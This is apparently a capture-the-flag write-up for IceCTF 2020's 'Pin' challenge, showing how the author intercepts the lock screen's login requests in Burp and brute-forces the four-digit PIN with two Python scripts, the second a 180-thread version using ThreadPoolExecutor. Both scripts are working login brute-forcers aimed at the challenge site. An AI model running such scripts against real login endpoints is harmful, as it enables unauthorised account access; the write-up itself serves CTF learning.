---
layout: post
title: IceCTF 2020 - Multithreading Requests 
---

IceCTF took place over the weekend and had a range of great challenges. This writeup will be focussing on the miscellaneous category and the "Pin" challenge, which involved looking at requests in Burp and multithreading using ThreadPool in Python for quick results. 

# The Challenge
**Name:** Pin

**Category:** Miscellaneous 


**Points:** 100


**Requirements:** Python, [Burp](https://portswigger.net/burp/communitydownload).


>You are late again, and just canâ€™t remember the PIN code to the [locker](http://www.misc-pin.vuln.icec.tf/) that has the secret Novichok stuff you need for work. What do you do?

# Initial Analysis
The link in the challenge description takes us to a pretty lockscreen which resembles that of an iPhone. Immediately I tried entering a bunch of random passwords such as 1234, 1337 ect. to see if anything in the URL would change when entered (or maybe even luck out and get it through guessing), but had no luck so I fired up Burp which will allow us to take a more in-depth look at what's going on behind the scenes on a website. 

![image](https://i.imgur.com/BZ21cjc.png)

Once Burp was ready to go, I navigated to Proxy and selected 'Open Browser' within that tab. This opens up a Chromium browser which Burp directly interfaces with. 'Intercept is on' should be selected by default, however if it isn't make sure to enable that to act as a middle-man and peek at requests. Now that we've got everything we need, we can paste the link in Chromium and see what the request looks like.

![image](https://i.imgur.com/VcQBa38.png)

First off, since we're only navigating to the site there's no parameter or link that's different to the one we were provided - we're not really interested in this. What we are intersted in is what happens when we enter in a passcode, so let's do that.

![image](https://i.imgur.com/z3o7mXy.png)

This looks more promising...we can see a GET request to another URL (www.misc-pin.vuln.icec.tf/login/1337) which contains the passcode we just entered. What does this mean? It means we can bruteforce it through spamming requests with all possible four-digit combinations! Something extra we can do is send this request to Burp's 'Repeater' - which can be done by right clicking the GET request and clicking the 'Send to Repeater' option.

![image](https://i.imgur.com/Ym30oug.png)

Navigate to the 'Repeater' tab and click 'Send'. This will show us the *response* from the website to our passcode, which gives us some JSON data. 

![image](https://i.imgur.com/I0HzeB0.png)

This is perfect, as it means we can check the resonse from the website to check if the ``correct`` field is true or false. 

# Bruteforcing Requests 
We now know that the passcode is sent to /login/ via a GET request, so all we need to do now is write a script that can try every passcode combination in a relatively short amount of time. This is where the Python [requests](https://pypi.org/project/requests/) library comes in handy. 

```python
import requests
  
for pin in range(1720,1750):
    # allows us to go 0001 instead of just 1
    pin = '{0:04}'.format(pin)
    print('Trying: ' + pin)

    # creates a URL and appends a passcode to try
    URL = "http://www.misc-pin.vuln.icec.tf/login/" + str(pin)

    # peforms a get request and stores the response in r
    r = requests.get(url = URL)
    temp = str(r.content)
    print(temp)

    if 'true' in temp:
        print('FOUND!' + '\nPASSWORD: ' + pin)
        quit()
```

The above is a relatively quick and easy solution that gets the job done...it's just really slow. I left it running, looked at some other challenges and eventually got a match for ``1729`` after 15 minutes.

![image](https://i.imgur.com/NalDvt5.png)

Now, it would've been okay to stop here as the challenge was now solved and we had the flag, but I knew that there was a much faster way to do this so I looked into multithreading in Python and came across [ThreadPoolExecutor](https://www.tutorialspoint.com/concurrency_in_python/concurrency_in_python_pool_of_threads.htm). 

```python
from concurrent.futures.thread import ThreadPoolExecutor
from requests import Session, Response
from requests.adapters import HTTPAdapter
from functools import partial
from multiprocessing import Pool
import tqdm
import os

def execute(urls, method, size):
    i = 0
    # creates a new session 
    session = Session()
    session.mount('http://', HTTPAdapter(pool_maxsize = size))

    # creates a worker that calls make_request
    worker = partial(method, session)

    # executes asynchronously with 180 make_request workers
    with ThreadPoolExecutor(size) as pool:

        # creates a pretty progres bar and allows us to check responses 
        for req in tqdm.tqdm(pool.map(worker, urls), total = len(urls)):
            temp = str(req.content)
            if "true" in temp:
                print("\n\nFOUND! Password is: " + str(i))
                print(str(req.content) + "\n")
                quit()
            i+=1
    session.close()

# method we want to multithread
def make_request(session, url):
    return session.get(url)

# generates a list of all 10000 URLs
urls = [("http://www.misc-pin.vuln.icec.tf/login/" + "{0:04}".format(num)) for num in range(9999)]

# kick starts the program with 180 workers
execute(urls, make_request, 180)
```

This solved the challenge in under 10 seconds (compared to 10 minutes before) and effectively works by doing the previous solution, but 180x faster. The optimised script gets through 1729 requests before the previous one can even reach 15. The reason I selected ``180`` for the amount of workers is because I found it was a sweet spot in terms of speed for my computer as it started to slow down with anything higher - although I'm sure this will greatly vary depending on a device's CPU. Here's a comparison between the two:

![image](https://i.imgur.com/uDPJldv.gif)


# What did I learn?
1) Multithreading is amazing for bruteforcing. 


2) Shorter solution != good. 
